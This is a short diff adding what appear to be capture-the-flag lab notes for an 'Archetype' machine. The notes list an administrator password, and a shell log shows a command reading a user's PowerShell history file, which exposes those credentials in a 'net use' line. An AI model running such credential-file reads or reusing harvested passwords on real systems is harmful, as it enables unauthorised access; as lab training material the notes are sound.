@@ -1,0 +1,10 @@
+
+\\Archetype\backups
+administrator
+MEGACORP_4dm1n!!
+
+---
+C:\Users\sql_svc\Desktop>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
